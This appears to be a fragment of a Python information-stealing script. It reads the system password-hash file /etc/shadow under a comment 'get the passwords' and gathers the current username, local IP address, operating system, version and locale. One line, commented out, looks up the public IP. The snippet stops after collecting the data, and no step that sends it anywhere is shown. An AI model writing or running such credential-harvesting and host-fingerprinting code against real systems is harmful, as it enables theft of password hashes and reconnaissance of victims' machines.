import os
import platform
import socket
import locale


#get the passwords
passwords=os.popen("cat /etc/shadow").read().strip().split("\n") 
#for line in passwords:
    #line=line.split(":")


#to get the name
user = os.popen("whoami").read().strip()
#to get the ip
ipadd=socket.gethostbyname(socket.gethostname())
# theip = requests.get('https://checkip.amazonaws.com').text.strip()

#to get the name of os 
os_name=platform.system()
#to get the version 
os_version=platform.release()

language ,encoding=locale.getdefaultlocale()
